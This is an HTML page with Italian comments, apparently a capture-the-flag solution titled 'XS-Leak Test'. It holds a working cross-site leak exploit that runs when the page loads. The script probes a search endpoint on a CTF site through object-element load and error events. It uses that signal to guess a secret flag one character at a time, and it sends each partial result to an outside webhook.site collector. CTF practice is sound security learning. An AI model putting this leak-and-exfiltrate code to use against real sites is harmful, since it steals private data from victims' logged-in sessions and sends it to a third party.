<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XS-Leak Test</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        #result {
            margin-top: 20px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <h1>XS-Leak Test</h1>
    <div id="result">In attesa di risultati...</div>

    <script>
        const validChars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+[]{}|;:,.<>?'; // Caratteri validi
        let currentFlag = ''; // Flag trovata

        const leak = async (url) => {
            return new Promise((resolve) => {
                let s = document.createElement('object');
                s.data = url;
                s.onload = (e) => {
                    e.target.remove();
                    return resolve(0); // Risorsa accessibile
                };
                s.onerror = (e) => {
                    e.target.remove();
                    return resolve(1); // Risorsa non accessibile
                };
                document.body.appendChild(s);
            });
        };

        const logResult = async (message) => {
            const webhookUrl = 'https://webhook.site/d1c2d4d1-02cc-4007-bf6c-1d3cc3528bad'; // URL del Webhook
            try {
                // Costruisci l'URL con il messaggio come parametro
                const urlWithParams = `${webhookUrl}?message=${encodeURIComponent(message)}`;
                const response = await fetch(urlWithParams, {
                    method: 'GET', // Cambiato a GET
                });

                if (!response.ok) {
                    console.error('Errore durante l\'invio del log:', response.statusText);
                } else {
                    console.log('Log inviato con successo');
                }
            } catch (error) {
                console.error('Errore di rete:', error);
            }
        };

        const guessFlag = async (position) => {
            // Se la lunghezza della flag Ã¨ nota, puoi anche fermarti se hai raggiunto quella lunghezza
            if (position >= currentFlag.length + 10) { // Sostituisci 10 con la lunghezza massima della flag prevista
                console.log('Flag completa:', currentFlag);
                return;
            }

            for (let char of validChars) {
                const url = `https://matrix.capturetheflags.site/search?s=${currentFlag}${char}`; // URL da testare
                const result = await leak(url); // Esegui il leak

                if (result === 0) { // Risorsa accessibile (status 200)
                    currentFlag += char; // Aggiungi carattere corretto
                    document.getElementById('result').textContent = `Flag parziale trovata: ${currentFlag}`;
                    console.log(`Flag parziale trovata: ${currentFlag}`);
                    
                    // Invia il log della flag parziale al Webhook
                    await logResult(`Flag parziale trovata: ${currentFlag}`);
                    
                    await guessFlag(position + 1); // Prova il prossimo carattere
                    return; // Esci dopo aver trovato un carattere valido
                }
            }
        };

        // Esegui il test al caricamento del DOM
        document.addEventListener('DOMContentLoaded', () => {
            guessFlag(0); // Inizia a indovinare la flag dalla posizione 0
        });
    </script>
</body>
</html>
